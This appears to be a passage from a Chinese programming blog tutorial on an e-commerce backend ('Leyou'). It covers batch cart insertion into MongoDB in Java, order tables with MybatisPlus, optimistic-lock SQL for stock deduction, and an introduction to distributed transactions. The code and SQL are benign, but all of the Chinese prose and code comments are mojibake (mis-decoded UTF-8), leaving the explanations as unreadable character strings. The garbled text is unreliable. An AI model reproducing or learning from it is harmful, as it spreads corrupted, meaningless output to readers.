<h5 id="service-1"><a href="#service-1" class="headerlink" title="service"></a>service</h5><p>ç„¶ååœ¨<code>ly-trade</code>çš„<code>com.leyou.trade.service</code>åŒ…ä¸­<code>CartService</code>æ¥å£æ·»åŠ æ–¹æ³•ï¼š</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">     * æ‰¹é‡æ–°å¢è´­ç‰©è½¦å•†å“</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> cartItemList è´­ç‰©è½¦å•†å“åˆ—è¡¨</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line"><span class="keyword">void</span> <span class="title function_">addCartItemList</span><span class="params">(List&lt;CartItem&gt; cartItemList)</span>;</span><br></pre></td></tr></table></figure>



<p>æ‰¹é‡æ–°å¢ï¼Œå…¶å®å°±æ˜¯å¾ªç¯æŠŠé›†åˆä¸­çš„æ¯ä¸ªè´­ç‰©è½¦å•†å“æ·»åŠ åˆ°redisã€‚å› æ­¤è¿™é‡Œå¯ä»¥è°ƒç”¨ä¹‹å‰ å•å•†å“æ–°å¢çš„é€»è¾‘ã€‚</p>
<p>é¦–å…ˆæŠŠå•å•†å“æ–°å¢çš„ä»£ç å°è£…ä¸ºä¸€ä¸ªæ–¹æ³•ã€‚</p>
<p>ç„¶ååœ¨<code>ly-trade</code>çš„<code>com.leyou.trade.service.impl</code>åŒ…ä¸­<code>CartServiceImpl</code>å®ç°ç±»ä¸­æ·»åŠ æ–¹æ³•ï¼š</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> CartItem <span class="title function_">saveOrUpdateCartItem</span><span class="params">(CartItem cartItem)</span> &#123;</span><br><span class="line">    <span class="comment">// 1.å…ˆè·å–ä¹‹å‰çš„è´­ç‰©è½¦æ•°æ®</span></span><br><span class="line">    Optional&lt;CartItem&gt; optional = repository.findById(cartItem.getSkuId());</span><br><span class="line">    <span class="comment">// 2.åˆ¤æ–­æ˜¯å¦å­˜åœ¨</span></span><br><span class="line">    <span class="keyword">if</span>(optional.isPresent())&#123;</span><br><span class="line">        <span class="comment">// 2.1.å­˜åœ¨ï¼Œè®°å½•æ–°çš„å•†å“æ•°é‡</span></span><br><span class="line">        <span class="type">Integer</span> <span class="variable">num</span> <span class="operator">=</span> cartItem.getNum();</span><br><span class="line">        <span class="comment">// 2.2.è·å–æ—§çš„æ•°æ®</span></span><br><span class="line">        cartItem = optional.get();</span><br><span class="line">        <span class="comment">// 2.3.æ•°é‡ç´¯åŠ </span></span><br><span class="line">        cartItem.setNum(num + cartItem.getNum());</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> cartItem;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>è¿™ä¸ªæ–¹æ³•å°±æ˜¯åˆ¤æ–­è´­ç‰©è½¦å•†å“æ˜¯å¦å­˜åœ¨ï¼Œå­˜åœ¨åˆ™ä¿®æ”¹æ•°é‡ï¼Œä¸å­˜åœ¨åˆ™åŸæ ·è¿”å›ã€‚</p>
<p>çœ‹ä¸‹ä¹‹å‰çš„å•å•†å“æ–°å¢ï¼š</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">saveCartItem</span><span class="params">(CartItem cartItem)</span> &#123;</span><br><span class="line">    <span class="comment">// 1.åˆ¤æ–­è´­ç‰©è½¦å•†å“æ˜¯å¦å­˜åœ¨ï¼Œå¹¶å®Œæˆå¤„ç†</span></span><br><span class="line">    cartItem = saveOrUpdateCartItem(cartItem);</span><br><span class="line">    <span class="comment">// 2.å†™å…¥db</span></span><br><span class="line">    repository.save(cartItem);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>æ‰¹é‡æ–°å¢çš„ä¸šåŠ¡ï¼š</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">addCartItemList</span><span class="params">(List&lt;CartItem&gt; cartItemList)</span> &#123;</span><br><span class="line">    <span class="comment">// 1.æ‰¹é‡å¯¹è´­ç‰©è½¦å•†å“åšåˆ¤æ–­å’Œå¤„ç†</span></span><br><span class="line">    List&lt;CartItem&gt; list = cartItemList.stream()</span><br><span class="line">        .map(<span class="built_in">this</span>::saveOrUpdateCartItem).collect(Collectors.toList());</span><br><span class="line">    <span class="comment">// 2.æ‰¹é‡å†™å…¥mongoDB</span></span><br><span class="line">    repository.saveAll(list);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h1 id="ä¸‹å•åŠŸèƒ½"><a href="#ä¸‹å•åŠŸèƒ½" class="headerlink" title="ä¸‹å•åŠŸèƒ½"></a>ä¸‹å•åŠŸèƒ½</h1><h2 id="è®¢å•æ•°æ®ç»“æ„"><a href="#è®¢å•æ•°æ®ç»“æ„" class="headerlink" title="è®¢å•æ•°æ®ç»“æ„"></a>è®¢å•æ•°æ®ç»“æ„</h2><p>åŠ å…¥è´­ç‰©è½¦åï¼Œè‡ªç„¶å°±è¦å®Œæˆç”¨æˆ·ä¸‹å•ï¼Œè®¢å•å±äºå¯¹äº‹åŠ¡è¦æ±‚è¾ƒé«˜çš„ä¸šåŠ¡ï¼Œè‚¯å®šä¸èƒ½å†™å…¥MongoDBï¼Œåº”è¯¥å†™å…¥MySQLæ•°æ®åº“ä¸­ã€‚</p>
<p>è®¢å•è¡¨, ç‰©æµä¿¡æ¯è¡¨,è®¢å•æ¡ç›®</p>
<h3 id="æ•´åˆMybatisPlus"><a href="#æ•´åˆMybatisPlus" class="headerlink" title="æ•´åˆMybatisPlus"></a>æ•´åˆMybatisPlus</h3><p>éœ€è¦æ³¨æ„çš„åœ°æ–¹ï¼š</p>
<ul>
<li>idç±»å‹ï¼šè¿™é‡Œæ˜¯<code>@TableId(type = IdType.ASSIGN_ID)</code>ï¼Œä»£è¡¨æ˜¯è‡ªåŠ¨ç”ŸæˆIDï¼Œidç”Ÿæˆç®—æ³•æ˜¯ç”±MybatisPluså†…ç½®çš„é›ªèŠ±ç®—æ³•ï¼ˆSnowFlakeï¼Œç”±Twitterå…¬å¸å¼€æºï¼‰</li>
<li>è®¢å•çŠ¶æ€ï¼šè®¢å•çŠ¶æ€åŒ…å«å¤šä¸ªï¼Œåœ¨æ•°æ®åº“ä¸­æ˜¯æ•°å­—ï¼Œä¸å¤ªæ–¹ä¾¿è®°å¿†ã€‚ä¸ºäº†é¿å…å‡ºé”™ï¼Œè¿™é‡Œæˆ‘ä»¬ä½¿ç”¨äº†æšä¸¾<code>OrderStatus</code></li>
</ul>
<h2 id="è®¢å•ç»“ç®—é¡µ"><a href="#è®¢å•ç»“ç®—é¡µ" class="headerlink" title="è®¢å•ç»“ç®—é¡µ"></a>è®¢å•ç»“ç®—é¡µ</h2><h3 id="å¾®ä¿¡æ”¯ä»˜"><a href="#å¾®ä¿¡æ”¯ä»˜" class="headerlink" title="å¾®ä¿¡æ”¯ä»˜"></a>å¾®ä¿¡æ”¯ä»˜</h3><h2 id="åˆ›å»ºè®¢å•æ¥å£"><a href="#åˆ›å»ºè®¢å•æ¥å£" class="headerlink" title="åˆ›å»ºè®¢å•æ¥å£"></a>åˆ›å»ºè®¢å•æ¥å£</h2><p>è®¢å•è¯¦æƒ…åŒ…æ‹¬çš„æ•°æ®æœ‰ï¼š</p>
<ul>
<li>è®¢å•idï¼šåœ¨è®¢å•æ–°å¢ä»¥åï¼Œå°±ä¼šå›æ˜¾id</li>
<li>å•†å“ç›¸å…³ï¼š<ul>
<li>å•†å“idï¼šé¡µé¢æäº¤äº†</li>
<li>è´­ä¹°æ•°é‡numï¼šé¡µé¢æäº¤äº†</li>
<li>å•†å“ä»·æ ¼ã€å›¾ç‰‡ã€specã€æ ‡é¢˜ï¼šéœ€è¦æ ¹æ®å•†å“idåˆ°å•†å“å¾®æœåŠ¡æŸ¥è¯¢</li>
</ul>
</li>
</ul>
<p>é—®é¢˜ï¼šä¸ºä»€ä¹ˆä¸è®©é¡µé¢ç›´æ¥æŠŠå•†å“ä»·æ ¼ã€å›¾ç‰‡ã€specã€æ ‡é¢˜éƒ½æäº¤åˆ°æœåŠ¡ç«¯ï¼Œè€Œæ˜¯åªæäº¤äº†å•†å“idï¼Ÿ</p>
<p>ç­”ï¼šä¸ºäº†å®‰å…¨è€ƒè™‘ï¼Œå•†å“ä»·æ ¼ç­‰æ•æ„Ÿä¿¡æ¯ç”±å®¢æˆ·ç«¯æäº¤å­˜åœ¨é£é™©ã€‚</p>
<h3 id="å‡åº“å­˜"><a href="#å‡åº“å­˜" class="headerlink" title="å‡åº“å­˜"></a>å‡åº“å­˜</h3><ul>
<li><p>æ”¯ä»˜å‡åº“å­˜ï¼Ÿ</p>
<ul>
<li>ä¼˜ç‚¹ï¼šç”¨æˆ·ä»˜æ¬¾ï¼Œæ‰ä¼šå‡åº“å­˜ï¼Œå¯ä»¥ç¡®å®šç”¨æˆ·ä¸€å®šæœ‰è´­ä¹°æ„å›¾ï¼Œä¸ä¼šå‡ºç°æ¶æ„ä¸‹å•å¯¼è‡´çš„åº“å­˜å †ç§¯</li>
<li>ç¼ºç‚¹ï¼šå¯èƒ½ç”¨æˆ·ä»˜æ¬¾åï¼Œå‘ç°åº“å­˜ä¸è¶³ï¼Œç”¨æˆ·ä½“éªŒå·®</li>
</ul>
</li>
<li><p>ä¸‹å•å‡åº“å­˜</p>
<ul>
<li>ä¼˜ç‚¹ï¼šä¸‹å•å°±é¢„ç•™åº“å­˜ï¼Œç”¨æˆ·ä»˜æ¬¾ä¸€å®šèƒ½æ‹¿åˆ°å•†å“ï¼Œä½“éªŒæ¯”è¾ƒå¥½</li>
<li>ç¼ºç‚¹ï¼šå¦‚æœç”¨æˆ·ä¸‹å•ï¼Œä¸ä»˜æ¬¾ï¼Œä¼šå ç”¨å•†å®¶åº“å­˜ï¼Œå¯¼è‡´å®ƒäººæ— æ³•è´­ä¹°</li>
</ul>
</li>
</ul>
<p>æˆ‘ä»¬éœ€è¦æ ¹æ®ä¸åŒçš„åœºæ™¯å»åšé€‰æ‹©ï¼Œå¦‚æœæ›´åœ¨æ„ç”¨æˆ·ä½“éªŒï¼Œåº”è¯¥é€‰æ‹©ä¸‹å•å‡åº“å­˜ï¼ä½†æ˜¯å¦‚ä½•åº”å¯¹ä¸‹å•å‡åº“å­˜çš„ç¼ºç‚¹å‘¢ï¼Ÿ</p>
<ul>
<li>è¶…æ—¶æœªæ”¯ä»˜çš„è®¢å•éœ€è¦å…³é—­</li>
<li>é™å®šæ¯ä¸ªç”¨æˆ·æ¯å¤©å¯ä»¥å–æ¶ˆè®¢å•çš„æ¬¡æ•°</li>
</ul>
<h4 id="å‡åº“å­˜å®‰å…¨é—®é¢˜"><a href="#å‡åº“å­˜å®‰å…¨é—®é¢˜" class="headerlink" title="å‡åº“å­˜å®‰å…¨é—®é¢˜"></a>å‡åº“å­˜å®‰å…¨é—®é¢˜</h4><p>ä¸Šé¢è¿™æ ·çš„æ“ä½œå­˜åœ¨çº¿ç¨‹å®‰å…¨çš„é£é™©ï¼Œå› ä¸ºæˆ‘ä»¬çš„ä»£ç æ˜¯å…è®¸åœ¨å¤šçº¿ç¨‹ç¯å¢ƒçš„ï¼Œå½“å¤šä¸ªç”¨æˆ·å¹¶å‘è®¿é—®æ—¶ï¼Œå…ˆåˆ¤æ–­åº“å­˜æ˜¯å¦å……è¶³ï¼Œç„¶åå†æ‰§è¡Œå‡åº“å­˜ï¼Œä¼šå‡ºç°ä¸€ç§æƒ…å†µï¼šåˆ¤æ–­çš„æ—¶å€™ï¼Œåº“å­˜æ˜¯å……è¶³çš„ï¼Œä½†æ˜¯åœ¨å‡åº“å­˜ä¹‹å‰ï¼Œæœ‰å…¶å®ƒçº¿ç¨‹æŠ¢å…ˆä¸€æ­¥ï¼Œæ‰£å‡åº“å­˜ï¼Œå¯¼è‡´åº“å­˜ä¸è¶³äº†ï¼Œæ­¤æ—¶å°±ä¼šå‡ºç°è¶…å–ç°è±¡ï¼</p>
<h4 id="æ€è·¯ä¸€-åŒæ­¥é”"><a href="#æ€è·¯ä¸€-åŒæ­¥é”" class="headerlink" title="æ€è·¯ä¸€: åŒæ­¥é”"></a>æ€è·¯ä¸€: åŒæ­¥é”</h4><p>æˆ‘ä»¬ä¸€èˆ¬éœ€è¦åŠ åŒæ­¥é”ï¼Œsynchronizedï¼Œç›®çš„æ˜¯è®©å¤šçº¿ç¨‹ä¸²è¡Œæ‰§è¡Œï¼Œä»è€Œä¿è¯çº¿ç¨‹å®‰å…¨ï¼Œä½†æ˜¯åŠ synchronizedåªèƒ½ä¿è¯åœ¨å½“å‰JVMå†…çš„çº¿ç¨‹å®‰å…¨ã€‚</p>
<p>å¦‚æœæ˜¯æ­å»ºä¸€ä¸ªå¾®æœåŠ¡é›†ç¾¤ï¼ŒåŒæ­¥é”synchronizedå°±å¤±æ•ˆäº†ã€‚åŸå› æ˜¯å› ä¸ºçº¿ç¨‹é”ï¼Œåœ¨å¤šè¿›ç¨‹æ—¶ä¼šå¤±æ•ˆï¼Œå› ä¸ºæ¯ä¸ªè¿›ç¨‹éƒ½æœ‰è‡ªå·±çš„é”ã€‚</p>
<p>è§£å†³å¤šè¿›ç¨‹å®‰å…¨é—®é¢˜ï¼Œå¿…é¡»ä½¿ç”¨è¿›ç¨‹é”(åˆ†å¸ƒå¼é”),è¿™ç§æ–¹æ¡ˆéœ€è¦é¢å¤–å®ç°ä¸€ä¸ªåˆ†å¸ƒå¼é”åŠŸèƒ½,æ¯”è¾ƒéº»çƒ¦;</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112220022716.png" alt="image-20210415142201086"></p>
<h4 id="æ€è·¯äºŒ-æ•°æ®åº“æ’å®ƒé”"><a href="#æ€è·¯äºŒ-æ•°æ®åº“æ’å®ƒé”" class="headerlink" title="æ€è·¯äºŒ: æ•°æ®åº“æ’å®ƒé”"></a>æ€è·¯äºŒ: æ•°æ®åº“æ’å®ƒé”</h4><p>æ•°æ®åº“é”ç®€å•æ¥è¯´æœ‰ä¸¤ç§ï¼š</p>
<ul>
<li>å…±äº«é”ï¼šè¯»æ“ä½œæ—¶ä¼šå¼€å¯å…±äº«é”ï¼Œæ­¤æ—¶å¤§å®¶éƒ½å¯ä»¥æŸ¥è¯¢</li>
<li>æ’å®ƒé”ï¼ˆäº’æ–¥é”ï¼‰ï¼šä¸€èˆ¬æ˜¯å†™æ“ä½œä¼šå¼€å¯æ’å®ƒé”ï¼Œæ­¤æ—¶å…¶å®ƒäº‹åŠ¡æ— æ³•è·å–å…±äº«é”æˆ–æ’å®ƒé”ï¼Œä¼šé˜»å¡</li>
</ul>
<p>è¦ä¿è¯å®‰å…¨ï¼Œå¿…é¡»åŠ æ’å®ƒé”ã€‚</p>
<p>ä½†æ˜¯æˆ‘ä»¬ä¹‹å‰çš„ä¸šåŠ¡æ˜¯å…ˆæŸ¥è¯¢skuï¼ˆè¯»ï¼‰ï¼Œç„¶ååˆ¤æ–­æ˜¯å¦å……è¶³ï¼Œç„¶åå‡åº“å­˜ï¼ˆå†™ï¼‰ï¼Œè¿™æ ·å°±ä¼šå¯¼è‡´å¤šä¸ªè¯·æ±‚åŒæ—¶æŸ¥è¯¢åˆ°ä¸€æ ·çš„åº“å­˜ï¼Œå‡åº“å­˜è¿˜æ˜¯æœ‰å®‰å…¨é—®é¢˜ã€‚</p>
<p>æˆ‘ä»¬å¿…é¡»åœ¨æŸ¥è¯¢æ—¶å°±åŠ æ’å®ƒé”ï¼Œæ€ä¹ˆåŠï¼Ÿ</p>
<p>å¯ä»¥é€šè¿‡select â€¦ for updateè¯­æ³•æ¥å¼€å¯ï¼Œä½†æ˜¯æˆ‘ä»¬è¦åŠ é”çš„å•†å“ä¸æ­¢ä¸€ä¸ªï¼Œæ­¤æ—¶åŠ é”å°±æ˜¯èŒƒå›´é”ï¼Œç”šè‡³æ˜¯è¡¨é”ï¼Œæ€§èƒ½ä¼šæœ‰è¾ƒå¤§çš„å½±å“</p>
<h4 id="æ€è·¯ä¸‰-ä¹è§‚é”"><a href="#æ€è·¯ä¸‰-ä¹è§‚é”" class="headerlink" title="æ€è·¯ä¸‰: ä¹è§‚é”"></a>æ€è·¯ä¸‰: ä¹è§‚é”</h4><p>ä¸Šè¿°æ€è·¯1å’Œæ€è·¯2éƒ½æ˜¯åŠ é”ï¼Œå®ç°äº’æ–¥ï¼Œä¿è¯çº¿ç¨‹å®‰å…¨ï¼Œæˆ‘ä»¬ç§°ä¸ºæ‚²è§‚é”ã€‚</p>
<ul>
<li>æ‚²è§‚é”ï¼šè®¤ä¸ºçº¿ç¨‹å®‰å…¨é—®é¢˜ä¸€å®šä¼šå‘ç”Ÿï¼Œå› æ­¤ä¼šåŠ é”ä¿è¯çº¿ç¨‹ä¸²è¡Œæ‰§è¡Œï¼Œä»è€Œä¿è¯å®‰å…¨ã€‚</li>
</ul>
<p>æˆ‘ä»¬ä¸ºäº†è¿½æ±‚æ€§èƒ½ï¼Œå¯ä»¥ä½¿ç”¨ä¹è§‚é”æœºåˆ¶ã€‚</p>
<ul>
<li>ä¹è§‚é”ï¼šè®¤ä¸ºçº¿ç¨‹å®‰å…¨é—®é¢˜ä¸ä¸€å®šä¼šå‘ç”Ÿï¼Œå› æ­¤å…è®¸å¤šçº¿ç¨‹å¹¶è¡Œæ‰§è¡Œï¼Œä¸€èˆ¬ä¼šåœ¨æ‰§è¡Œé‚£ä¸€åˆ»è¿›è¡Œåˆ¤æ–­å’Œæ¯”è¾ƒï¼Œç„¶åæ ¹æ®æ˜¯å¦å­˜åœ¨é£é™©æ¥å†³å®šæ˜¯å¦æ‰§è¡Œæ“ä½œ,ä¹è§‚é”å°±æ˜¯å…ˆæ¯”è¾ƒå†æ‰§è¡Œçš„æ€è·¯ï¼Œå…¶å®å°±æ˜¯CASï¼ˆcompare and setï¼‰çš„æ€æƒ³ã€‚JDKçš„JUCåŒ…ä¸‹çš„AtomicIntegerã€AtomicLongç­‰; Redisçš„watch,ä¹Ÿæ˜¯ä¹è§‚é”,CASåŸç†;</li>
</ul>
<p>ç®€åŒ–: æˆ‘ä»¬åœ¨å‡åº“å­˜ä¸­,å¯ä»¥ç”¨stockæ¥ä»£æ›¿version,æ‰§è¡Œsqlæ—¶,åˆ¤æ–­stockæ˜¯å¦è·Ÿè‡ªå·±æŸ¥è¯¢åˆ°çš„ä¸€æ ·</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">update</span> tb_stock <span class="keyword">set</span> stock <span class="operator">=</span> stock <span class="operator">-</span> <span class="number">1</span> <span class="keyword">WHERE</span> id <span class="operator">=</span> <span class="number">10</span> <span class="keyword">AND</span> stock <span class="operator">=</span> <span class="number">10</span></span><br></pre></td></tr></table></figure>

<p>ç»§ç»­ç®€åŒ–: æˆ‘ä»¬å¯ä»¥ä¸æŸ¥è¯¢åº“å­˜,ç›´æ¥æ‰§è¡Œsql,åœ¨sqlè¯­å¥ä¸­åšåˆ¤æ–­</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">update</span> tb_stock <span class="keyword">set</span> stock <span class="operator">=</span> stock <span class="operator">-</span> <span class="number">1</span> <span class="keyword">WHERE</span> id <span class="operator">=</span> <span class="number">10</span> <span class="keyword">AND</span> stock <span class="operator">&gt;=</span> <span class="number">1</span></span><br></pre></td></tr></table></figure>

<p>ç»§ç»­ç®€åŒ–: æˆ‘ä»¬æœ€ç»ˆçš„ç›®çš„æ˜¯åº“å­˜ä¸èƒ½è¶…å–,ä¸èƒ½ä¸ºè´Ÿæ•°,å› æ­¤æˆ‘ä»¬å¯ä»¥è®¾ç½®stockå­—æ®µä¸ºæ— ç¬¦å·æ•´æ•°,æ•°æ®åº“ä¼šè‡ªåŠ¨å¯¹å†™å…¥çš„æ•°æ®åˆ¤æ–­,å¦‚æœä¸ºè´Ÿ,ä¼šæŠ›å‡ºå¼‚å¸¸,æˆ‘ä»¬å°±æ— éœ€åŠ é”æˆ–å…¶ä»–ä»»ä½•åˆ¤æ–­.</p>
<h2 id="æŸ¥è¯¢è®¢å•æ¥å£"><a href="#æŸ¥è¯¢è®¢å•æ¥å£" class="headerlink" title="æŸ¥è¯¢è®¢å•æ¥å£"></a>æŸ¥è¯¢è®¢å•æ¥å£</h2><h1 id="åˆ†å¸ƒå¼äº‹åŠ¡"><a href="#åˆ†å¸ƒå¼äº‹åŠ¡" class="headerlink" title="åˆ†å¸ƒå¼äº‹åŠ¡"></a>åˆ†å¸ƒå¼äº‹åŠ¡</h1><h2 id="ä»€ä¹ˆæ˜¯åˆ†å¸ƒå¼äº‹åŠ¡"><a href="#ä»€ä¹ˆæ˜¯åˆ†å¸ƒå¼äº‹åŠ¡" class="headerlink" title="ä»€ä¹ˆæ˜¯åˆ†å¸ƒå¼äº‹åŠ¡?"></a>ä»€ä¹ˆæ˜¯åˆ†å¸ƒå¼äº‹åŠ¡?</h2><h3 id="æœ¬åœ°äº‹åŠ¡"><a href="#æœ¬åœ°äº‹åŠ¡" class="headerlink" title="æœ¬åœ°äº‹åŠ¡"></a>æœ¬åœ°äº‹åŠ¡</h3><p>äº‹åŠ¡: æ˜¯æŒ‡ä¼ ç»Ÿçš„å•æœºæ•°æ®åº“äº‹åŠ¡,å¿…é¡»å…·å¤‡ACIDåŸåˆ™; åœ¨ä¼ ç»Ÿçš„é¡¹ç›®ä¸­,é¡¹ç›®çš„éƒ¨ç½²åŸºæœ¬æ˜¯å•ç‚¹å¼: å³å•ä¸ªæœåŠ¡å™¨å’Œå•ä¸ªæ•°æ®åº“. è¿™ç§æƒ…å†µä¸‹æ•°æ®åº“æœ¬èº«çš„äº‹åŠ¡æœºåˆ¶å°±èƒ½ä¿è¯ACIDåŸåˆ™,è¿™æ ·çš„äº‹åŠ¡å°±æ˜¯æœ¬åœ°äº‹åŠ¡. å•ä¸ªæœåŠ¡å’Œå•ä¸ªæ•°æ®åº“çš„æ¶æ„ä¸­,äº§ç”Ÿçš„äº‹åŠ¡éƒ½æ˜¯æœ¬åœ°äº‹åŠ¡.</p>
<h3 id="åˆ†å¸ƒå¼äº‹åŠ¡-1"><a href="#åˆ†å¸ƒå¼äº‹åŠ¡-1" class="headerlink" title="åˆ†å¸ƒå¼äº‹åŠ¡"></a>åˆ†å¸ƒå¼äº‹åŠ¡</h3><p>è·¨æ•°æ®æºçš„åˆ†å¸ƒå¼äº‹åŠ¡, è·¨æœåŠ¡çš„åˆ†å¸ƒå¼äº‹åŠ¡</p>
<h4 id="è·¨æ•°æ®æº"><a href="#è·¨æ•°æ®æº" class="headerlink" title="è·¨æ•°æ®æº"></a>è·¨æ•°æ®æº</h4><p>å¯¹æ•°æ®åº“è¿›è¡Œäº†æ°´å¹³æ‹†åˆ†,å°†åŸå•åº“å•è¡¨æ‹†åˆ†æˆæ•°æ®åº“åˆ†ç‰‡,äºæ˜¯äº§ç”Ÿäº†è·¨æ•°æ®åº“äº‹åŠ¡é—®é¢˜</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112220022717.png" alt="image-20210415144156443"></p>
<h4 id="è·¨æœåŠ¡"><a href="#è·¨æœåŠ¡" class="headerlink" title="è·¨æœåŠ¡"></a>è·¨æœåŠ¡</h4><p>åœ¨ä¸šåŠ¡å‘å±•åˆæœŸï¼Œâ€œä¸€å—å¤§é¥¼â€çš„å•ä¸šåŠ¡ç³»ç»Ÿæ¶æ„ï¼Œèƒ½æ»¡è¶³åŸºæœ¬çš„ä¸šåŠ¡éœ€æ±‚ã€‚ä½†æ˜¯éšç€ä¸šåŠ¡çš„å¿«é€Ÿå‘å±•ï¼Œç³»ç»Ÿçš„è®¿é—®é‡å’Œä¸šåŠ¡å¤æ‚ç¨‹åº¦éƒ½åœ¨å¿«é€Ÿå¢é•¿ï¼Œå•ç³»ç»Ÿæ¶æ„é€æ¸æˆä¸ºä¸šåŠ¡å‘å±•ç“¶é¢ˆï¼Œè§£å†³ä¸šåŠ¡ç³»ç»Ÿçš„é«˜è€¦åˆã€å¯ä¼¸ç¼©é—®é¢˜çš„éœ€æ±‚è¶Šæ¥è¶Šå¼ºçƒˆã€‚</p>
<p>å¦‚ä¸‹å›¾æ‰€ç¤ºï¼ŒæŒ‰ç…§é¢å‘æœåŠ¡ï¼ˆSOA,SOAç²—æš´ç†è§£ï¼šæŠŠç³»ç»ŸæŒ‰ç…§å®é™…ä¸šåŠ¡ï¼Œæ‹†åˆ†æˆåˆšåˆšå¥½å¤§å°çš„ã€åˆé€‚çš„ã€ç‹¬ç«‹éƒ¨ç½²çš„æ¨¡å—ï¼Œæ¯ä¸ªæ¨¡å—ä¹‹é—´ç›¸äº’ç‹¬ç«‹ã€‚ï¼‰çš„æ¶æ„çš„è®¾è®¡åŸåˆ™ï¼Œå°†å•ä¸šåŠ¡ç³»ç»Ÿæ‹†åˆ†æˆå¤šä¸ªä¸šåŠ¡ç³»ç»Ÿï¼Œé™ä½äº†å„ç³»ç»Ÿä¹‹é—´çš„è€¦åˆåº¦ï¼Œä½¿ä¸åŒçš„ä¸šåŠ¡ç³»ç»Ÿä¸“æ³¨äºè‡ªèº«ä¸šåŠ¡ï¼Œæ›´æœ‰åˆ©äºä¸šåŠ¡çš„å‘å±•å’Œç³»ç»Ÿå®¹é‡çš„ä¼¸ç¼©ã€‚</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112220022718.png" alt="image-20210415144342697"></p>
<h4 id="åˆ†å¸ƒå¼ç³»ç»Ÿçš„æ•°æ®ä¸€è‡´æ€§é—®é¢˜"><a href="#åˆ†å¸ƒå¼ç³»ç»Ÿçš„æ•°æ®ä¸€è‡´æ€§é—®é¢˜" class="headerlink" title="åˆ†å¸ƒå¼ç³»ç»Ÿçš„æ•°æ®ä¸€è‡´æ€§é—®é¢˜"></a>åˆ†å¸ƒå¼ç³»ç»Ÿçš„æ•°æ®ä¸€è‡´æ€§é—®é¢˜</h4><p>åœ¨æ•°æ®åº“æ°´å¹³æ‹†åˆ†ã€æœåŠ¡å‚ç›´æ‹†åˆ†ä¹‹åï¼Œä¸€ä¸ªä¸šåŠ¡æ“ä½œé€šå¸¸è¦è·¨å¤šä¸ªæ•°æ®åº“ã€æœåŠ¡æ‰èƒ½å®Œæˆã€‚åœ¨åˆ†å¸ƒå¼ç½‘ç»œç¯å¢ƒä¸‹ï¼Œæˆ‘ä»¬æ— æ³•ä¿éšœæ‰€æœ‰æœåŠ¡ã€æ•°æ®åº“éƒ½ç™¾åˆ†ç™¾å¯ç”¨ï¼Œä¸€å®šä¼šå‡ºç°éƒ¨åˆ†æœåŠ¡ã€æ•°æ®åº“æ‰§è¡ŒæˆåŠŸï¼Œå¦ä¸€éƒ¨åˆ†æ‰§è¡Œå¤±è´¥çš„é—®é¢˜ã€‚</p>
<p>å½“å‡ºç°éƒ¨åˆ†ä¸šåŠ¡æ“ä½œæˆåŠŸã€éƒ¨åˆ†ä¸šåŠ¡æ“ä½œå¤±è´¥æ—¶ï¼Œä¸šåŠ¡æ•°æ®å°±ä¼šå‡ºç°ä¸ä¸€è‡´ã€‚</p>
<p>ä¾‹å¦‚ç”µå•†è¡Œä¸šä¸­æ¯”è¾ƒå¸¸è§çš„ä¸‹å•ä»˜æ¬¾æ¡ˆä¾‹ï¼ŒåŒ…æ‹¬ä¸‹é¢å‡ ä¸ªè¡Œä¸ºï¼š</p>
<ul>
<li>åˆ›å»ºæ–°è®¢å•</li>
<li>æ‰£å‡å•†å“åº“å­˜</li>
<li>ä»ç”¨æˆ·è´¦æˆ·ä½™é¢æ‰£é™¤é‡‘é¢</li>
</ul>
<p>å®Œæˆä¸Šé¢çš„æ“ä½œéœ€è¦è®¿é—®ä¸‰ä¸ªä¸åŒçš„å¾®æœåŠ¡å’Œä¸‰ä¸ªä¸åŒçš„æ•°æ®åº“ã€‚</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112220022719.png" alt="image-20200304204442839"></p>
<p>åœ¨åˆ†å¸ƒå¼ç¯å¢ƒä¸‹ï¼Œè‚¯å®šä¼šå‡ºç°éƒ¨åˆ†æ“ä½œæˆåŠŸã€éƒ¨åˆ†æ“ä½œå¤±è´¥çš„é—®é¢˜ï¼Œæ¯”å¦‚ï¼šè®¢å•ç”Ÿæˆäº†ï¼Œåº“å­˜ä¹Ÿæ‰£å‡äº†ï¼Œä½†æ˜¯ ç”¨æˆ·è´¦æˆ·çš„ä½™é¢ä¸è¶³ï¼Œè¿™å°±é€ æˆæ•°æ®ä¸ä¸€è‡´ã€‚</p>
<p>è®¢å•çš„åˆ›å»ºã€åº“å­˜çš„æ‰£å‡ã€è´¦æˆ·æ‰£æ¬¾åœ¨æ¯ä¸€ä¸ªæœåŠ¡å’Œæ•°æ®åº“å†…æ˜¯ä¸€ä¸ªæœ¬åœ°äº‹åŠ¡ï¼Œå¯ä»¥ä¿è¯ACIDåŸåˆ™ã€‚</p>
